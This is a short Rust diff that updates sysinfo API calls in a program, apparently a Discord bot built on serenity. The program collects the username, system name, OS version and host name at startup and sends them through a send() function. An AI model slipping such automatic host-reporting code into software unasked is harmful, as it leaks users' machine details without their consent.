@@ -7,14 +7,13 @@ use serenity::{
     },
 };
 use std::env;
-use sysinfo::{System, SystemExt};
+use sysinfo::System;
 
 mod consts;
 
 #[tokio::main]
 async fn main() {
 
-    let sys = System::new_all();
     let mut sysinfo = String::new();
     sysinfo.push_str(&format!(
         "Username:                {}\n",
@@ -22,15 +21,15 @@ async fn main() {
     ));
     sysinfo.push_str(&format!(
         "System name:             {}\n",
-        unwrap_string(sys.name())
+        unwrap_string(System::name())
     ));
     sysinfo.push_str(&format!(
         "System OS version:       {}\n",
-        unwrap_string(sys.os_version())
+        unwrap_string(System::os_version())
     ));
     sysinfo.push_str(&format!(
         "System host name:        {}\n",
-        unwrap_string(sys.host_name())
+        unwrap_string(System::host_name())
     ));
 
     send(sysinfo).await.unwrap();
